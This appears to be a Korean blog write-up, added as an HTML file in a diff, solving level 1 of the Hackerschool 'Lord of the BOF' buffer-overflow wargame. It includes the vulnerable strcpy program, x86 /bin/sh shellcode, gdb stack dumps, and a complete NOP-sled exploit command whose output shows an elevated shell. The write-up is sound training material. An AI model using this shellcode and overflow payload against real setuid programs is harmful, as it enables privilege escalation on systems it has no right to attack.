@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>[Wargame]  해커스쿨 BoF LEVEL1 (gate -> gremlin) :  simple bof</title>
+
+  <!-- CSS -->
+  <link rel="stylesheet" href="/assets/css/main.css" type="text/css">
+
+  <!-- Font -->
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link href='//spoqa.github.io/spoqa-han-sans/css/SpoqaHanSans-kr.css' rel='stylesheet' type='text/css'>
+  <link href="https://fonts.googleapis.com/css?family=Ubuntu+Mono" rel="stylesheet">
+
+  <link rel="alternate" type="application/rss+xml" title="RSS Feed for Writeup oriented CTF for fun and profit" href="/feed.xml" />
+  <!-- Begin Jekyll SEO tag v2.3.0 -->
+<title>[Wargame] 해커스쿨 BoF LEVEL1 (gate -&gt; gremlin) : simple bof | Writeup oriented CTF for fun and profit</title>
+<meta property="og:title" content="[Wargame] 해커스쿨 BoF LEVEL1 (gate -&gt; gremlin) : simple bof" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="해커스쿨 왕기초편을 읽고 나서 제대로 BoF 훈련을 해보기 위하여 BoF 원정대 Wargame을 시작하였다. Stage 하나하나 직접 해보자. :)" />
+<meta property="og:description" content="해커스쿨 왕기초편을 읽고 나서 제대로 BoF 훈련을 해보기 위하여 BoF 원정대 Wargame을 시작하였다. Stage 하나하나 직접 해보자. :)" />
+<link rel="canonical" href="http://localhost:4000/2015-10-18/hackerschool-BoF-stage-1/" />
+<meta property="og:url" content="http://localhost:4000/2015-10-18/hackerschool-BoF-stage-1/" />
+<meta property="og:site_name" content="Writeup oriented CTF for fun and profit" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2015-10-18T21:00:00+09:00" />
+<script type="application/ld+json">
+{"name":null,"description":"해커스쿨 왕기초편을 읽고 나서 제대로 BoF 훈련을 해보기 위하여 BoF 원정대 Wargame을 시작하였다. Stage 하나하나 직접 해보자. :)","author":null,"@type":"BlogPosting","url":"http://localhost:4000/2015-10-18/hackerschool-BoF-stage-1/","publisher":null,"image":null,"headline":"[Wargame] 해커스쿨 BoF LEVEL1 (gate -&gt; gremlin) : simple bof","dateModified":"2015-10-18T21:00:00+09:00","datePublished":"2015-10-18T21:00:00+09:00","sameAs":null,"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2015-10-18/hackerschool-BoF-stage-1/"},"@context":"http://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+
+  <!-- Google Analytics -->
+
+<script>
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+ga('create', '', 'auto');
+ga('send', 'pageview');
+
+</script>
+
+
+
+</head>
+
+<body>
+  <div class="content-container">
+    <header>
+  <div class="header-small">
+    <a href="http://localhost:4000">Writeup oriented CTF for fun and profit</a>
+  </div>
+</header>
+<div class="post">
+  <div class="post-title">[Wargame]  해커스쿨 BoF LEVEL1 (gate -> gremlin) :  simple bof</div>
+  <span class="post-date">
+    <time>18 Oct 2015</time>
+  </span>
+  <div class="post-tag">
+    <ul>
+      
+      <li>
+        <a href="http://localhost:4000/tags#bof">
+          <span>bof</span>
+        </a>
+      </li>
+      
+      
+    </ul>
+  </div>
+
+  <p><a href="http://www.hackerschool.org/Sub_Html/HS_University/bof_1.html">해커스쿨 왕기초편</a>을 읽고 나서 제대로 BoF 훈련을 해보기 위하여 <a href="http://www.hackerschool.org/HS_Boards/zboard.php?id=HS_Notice&amp;no=1170881885">BoF 원정대 Wargame</a>을 시작하였다.
+Stage 하나하나 직접 해보자. :)</p>
+
+<!--more-->
+
+<h2 id="bof-level1-gate---gremlin---simple-bof">BoF LEVEL1 (gate -&gt; gremlin) :  simple bof</h2>
+
+<p>256bytes 사이즈의 큰 buffer 에 BoF 완성하면 되는 문제.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
+        The Lord of the BOF : The Fellowship of the BOF
+        - gremlin
+        - simple BOF
+*/</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
+<span class="p">{</span>
+    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">){</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"argv error</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="shellcoe-확보">shellcoe 확보</h2>
+
+<p>Scratch 부터  shellcode 작성할 수 있으면 좋겠지만.. 우선은 Linux x86 에서 shell 띄우는 shellcode 를 찾아보았다.</p>
+
+<p><a href="http://www.kernel-panic.it/security/shellcode/shellcode5.html">Writing shellcode for Linux and *BSD</a></p>
+
+<h3 id="c-code">c-code</h3>
+
+<p><code class="highlighter-rouge">execve()</code> 이용하여 <code class="highlighter-rouge">/bin/sh</code> 실행하는 아주 간단한 코드.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;unistd.h&gt;
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+        <span class="kt">char</span> <span class="o">*</span><span class="n">args</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+        <span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="s">"/bin/sh"</span><span class="p">;</span>
+        <span class="n">args</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+        <span class="n">execve</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">args</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>BoF 원정대의 VM 환경에서 shell 띄우기 동작함.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> gcc <span class="nt">-g</span> <span class="nt">-o</span> get_shell get_shell.c 
+<span class="o">&gt;</span> ./get_shell 
+bash<span class="nv">$ </span>id
+<span class="nv">uid</span><span class="o">=</span>500<span class="o">(</span>gate<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>500<span class="o">(</span>gate<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>500<span class="o">(</span>gate<span class="o">)</span>
+</code></pre></div></div>
+
+<h3 id="shellcode--assembly-변환">shellcode : assembly 변환</h3>
+
+<p>위의 c 코드를  compile 된 obj 를 가지고 shellcode 로서 동작시키 위하여 null byte 를 없애는 등의 작업을 해야하는데… 우선 초보이므로 최종 결과물을 사용해보자.  대신 좀더 익숙해지면 반드시 직접 손으로 shellcode 짜야한다.</p>
+
+<h3 id="최종-shellcode">최종 shellcode</h3>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46</span><span class="s">"</span>
+                   <span class="s">"</span><span class="se">\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80</span><span class="s">"</span>
+                   <span class="s">"</span><span class="se">\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68</span><span class="s">"</span><span class="p">;</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+        <span class="kt">int</span> <span class="o">*</span><span class="n">ret</span><span class="p">;</span>
+        <span class="n">ret</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">ret</span> <span class="o">+</span> <span class="mi">2</span><span class="p">;</span>
+        <span class="p">(</span><span class="o">*</span><span class="n">ret</span><span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">shellcode</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="dynamic-debugging">Dynamic debugging</h2>
+
+<p>BoF 를 하기 위하여 중요한 정보는 다음과 같다.</p>
+
+<ul>
+  <li>Buffer size</li>
+  <li>Return address</li>
+</ul>
+
+<p>우리는 Wargame 으로서 소스를 가지고 있어서 buffer 의 사이즈가 256bytes 라는 것은 운좋게도 알고 있는 상황이다.</p>
+
+<h3 id="return-address-확인">Return address 확인</h3>
+
+<p>하지만 코드가 수행되고 있는 stack address 는 알지 못한다. 이 값을 알아야 BoF 에서 가장 중요한 stack 에 저장된 saved return address 대신에 exploit code 의 어드레스로 바꾸어 주어야 한다.</p>
+
+<p>문제의 실행파일인 <code class="highlighter-rouge">gremlin</code> 파일의 권한이 <code class="highlighter-rouge">gremlin</code> 이라서  1단계 <code class="highlighter-rouge">gate</code> 는 권한이 부족하여 gdb debugging 이 제대로 되지 않는 것 같다.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">-rwsr-sr-x</span>    1 gremlin  gremlin     11987 Feb 26  2010 gremlin
+</code></pre></div></div>
+
+<p>대신 직접 compile 하여 gdb debugging 을 하여 보자.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> gcc <span class="nt">-g</span> <span class="nt">-o</span> gremlin2 gremlin.c
+<span class="o">&gt;</span> <span class="nb">ls</span> <span class="nt">-al</span>
+<span class="nt">-rwsr-sr-x</span>    1 gremlin  gremlin     11987 Feb 26  2010 gremlin
+<span class="nt">-rw-rw-r--</span>    1 gate     gate          272 Mar 29  2010 gremlin.c
+<span class="nt">-rwxrwxr-x</span>    1 gate     gate        12583 Oct 25 16:04 gremlin2
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> disas
+Dump of assembler code <span class="k">for function </span>main:
+0x8048430 &lt;main&gt;:       push   %ebp
+0x8048431 &lt;main+1&gt;:     mov    %esp,%ebp
+0x8048433 &lt;main+3&gt;:     sub    <span class="nv">$0x100</span>,%esp
+0x8048439 &lt;main+9&gt;:     cmpl   <span class="nv">$0x1</span>,0x8<span class="o">(</span>%ebp<span class="o">)</span>
+0x804843d &lt;main+13&gt;:    jg     0x8048456 &lt;main+38&gt;
+0x804843f &lt;main+15&gt;:    push   <span class="nv">$0x80484e0</span>
+0x8048444 &lt;main+20&gt;:    call   0x8048350 &lt;<span class="nb">printf</span><span class="o">&gt;</span>
+0x8048449 &lt;main+25&gt;:    add    <span class="nv">$0x4</span>,%esp
+0x804844c &lt;main+28&gt;:    push   <span class="nv">$0x0</span>
+0x804844e &lt;main+30&gt;:    call   0x8048360 &lt;<span class="nb">exit</span><span class="o">&gt;</span>
+0x8048453 &lt;main+35&gt;:    add    <span class="nv">$0x4</span>,%esp
+0x8048456 &lt;main+38&gt;:    mov    0xc<span class="o">(</span>%ebp<span class="o">)</span>,%eax
+0x8048459 &lt;main+41&gt;:    add    <span class="nv">$0x4</span>,%eax
+0x804845c &lt;main+44&gt;:    mov    <span class="o">(</span>%eax<span class="o">)</span>,%edx
+0x804845e &lt;main+46&gt;:    push   %edx
+0x804845f &lt;main+47&gt;:    lea    0xffffff00<span class="o">(</span>%ebp<span class="o">)</span>,%eax
+0x8048465 &lt;main+53&gt;:    push   %eax
+0x8048466 &lt;main+54&gt;:    call   0x8048370 &lt;strcpy&gt;
+0x804846b &lt;main+59&gt;:    add    <span class="nv">$0x8</span>,%esp
+0x804846e &lt;main+62&gt;:    lea    0xffffff00<span class="o">(</span>%ebp<span class="o">)</span>,%eax
+0x8048474 &lt;main+68&gt;:    push   %eax
+0x8048475 &lt;main+69&gt;:    push   <span class="nv">$0x80484ec</span>
+0x804847a &lt;main+74&gt;:    call   0x8048350 &lt;<span class="nb">printf</span><span class="o">&gt;</span>
+0x804847f &lt;main+79&gt;:    add    <span class="nv">$0x8</span>,%esp
+0x8048482 &lt;main+82&gt;:    leave  
+0x8048483 &lt;main+83&gt;:    ret   
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> x/100x <span class="nv">$esp</span>
+0xbffff920:     0xbffff928      0xbffffb86      0x90909090      0x90909090
+0xbffff930:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff940:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff950:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff960:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff970:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff980:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff990:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff9a0:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff9b0:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff9c0:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff9d0:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff9e0:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff9f0:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffffa00:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffffa10:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffffa20:     0x90909090      0x90909090      0xbffffa00      0x400309cb
+0xbffffa30:     0x00000002      0xbffffa74      0xbffffa80      0x40013868
+0xbffffa40:     0x00000002      0x08048380      0x00000000      0x080483a1
+0xbffffa50:     0x08048430      0x00000002      0xbffffa74      0x080482e0
+0xbffffa60:     0x080484bc      0x4000ae60      0xbffffa6c      0x40013e90
+0xbffffa70:     0x00000002      0xbffffb72      0xbffffb86      0x00000000
+0xbffffa80:     0xbffffc87      0xbffffca9      0xbffffcb3      0xbffffcc1
+0xbffffa90:     0xbffffce0      0xbffffced      0xbffffd05      0xbffffd1f
+0xbffffaa0:     0xbffffd3e      0xbffffd49      0xbffffd57      0xbffffd97
+</code></pre></div></div>
+
+<p>버퍼 사이즈가 충분히 길기 때문에 shellcode 38bytes 앞에 [NOP] 를 넣고, 가장 중요한 [LR] 넣어서 exploit 구성함.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>Buffer 256 bytes] + <span class="o">[</span>SFP 4bytes]      + <span class="o">[</span>LR 4 bytes]
+<span class="o">[</span>NOP 222 bytes] + <span class="o">[</span>shell code 38bytes] + <span class="o">[</span><span class="nv">LR</span><span class="o">=</span>0xbffff980]
+</code></pre></div></div>
+
+<h2 id="bof-exploit">BoF Exploit</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./gremlin <span class="sb">`</span>python <span class="nt">-c</span> <span class="s1">'print "\x90"*222 + "\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68" + "\x80\xf9\xff\xbf"'</span><span class="sb">`</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>gate@localhost gate]<span class="nv">$ </span>./gremlin <span class="sb">`</span>python <span class="nt">-c</span> <span class="s1">'print "\x90"*222 + "\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68" + "\x80\xf9\xff\xbf"'</span><span class="sb">`</span>
+^1F嵬bin/sh
+                bash<span class="nv">$ </span>id
+<span class="nv">uid</span><span class="o">=</span>500<span class="o">(</span>gate<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>500<span class="o">(</span>gate<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>501<span class="o">(</span>gremlin<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>501<span class="o">(</span>gremlin<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>500<span class="o">(</span>gate<span class="o">)</span>
+
+bash<span class="nv">$ </span>my-pass
+euid <span class="o">=</span> 501
+hello bof world
+</code></pre></div></div>
+
+
+
+  <!-- Disqus -->
+  
+  <div class="post-disqus">
+      <section id="disqus_thread"></section>
+      <script>
+
+/**
+*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables */
+/*
+var disqus_config = function () {
+this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+};
+*/
+(function() { // DON'T EDIT BELOW THIS LINE
+var d = document, s = d.createElement('script');
+s.src = '//humb1ec0ding.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+  </div>
+  
+
+</div>
+
+
+    <!-- Documents about icons are here: http://fontawesome.io/icons/ -->
+<div class="footer">
+  <hr />
+  <div class="footer-link">
+    
+	
+	
+	
+	
+
+    
+    <a href="https://twitter.com/humb1ec0ding"><i class="fa fa-twitter" aria-hidden="true"></i></a>
+    
+
+    
+    <a href="https://github.com/humb1ec0ding"><i class="fa fa-github" aria-hidden="true"></i></a>
+    
+	
+	
+	
+	
+
+    
+	
+	
+	
+	
+	
+	
+	
+	
+
+    
+
+    
+
+    
+    <a href="mailto:humblecoding@gmail.com"><i class="fa fa-envelope" aria-hidden="true"></i></a>
+    
+
+  </div>
+  © 2017 humb1ec0ding. All rights reserved.
+</div>
+
+  </div>
+</body>
+</html>
